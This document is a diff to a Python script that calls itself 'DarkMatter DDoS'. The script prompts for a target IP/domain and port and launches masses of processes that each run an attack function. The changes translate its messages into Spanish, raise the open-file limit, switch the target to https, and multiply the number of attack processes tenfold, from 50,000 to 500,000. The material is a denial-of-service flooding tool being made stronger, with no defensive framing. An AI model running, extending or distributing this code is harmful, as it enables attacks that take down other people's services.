@@ -7,16 +7,16 @@ import platform
 
 print("Detecting System...")
 sysOS = platform.system()
-print("System detected: ", sysOS)
+print("Sistema detectado: ", sysOS)
 
 if sysOS == "Linux":
   try:
-    os.system("ulimit -n 2330000")
+    os.system("ulimit -n 23300000")
   except Exception as e:
     print(e)
-    print("Could not start the script")
+    print("No se pudo iniciar el script")
 else:
-  print("Your system is not Linux, You may not be able to run this script in some systems")
+  print("Su sistema no es Linux, es posible que no pueda ejecutar este script en algunos sistemas")
 
 
 def randomip():
@@ -42,15 +42,15 @@ def attack():
     except:
       pass
 
-print("Welcome To DarkMatter DDoS\n")
+print("Bienvenido a DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"http://{str(ip)}" 
+url = f"https://{str(ip)}" 
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 def send2attack():
-  for i in range(50000): #Magic Power
+  for i in range(500000): #Poder Mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
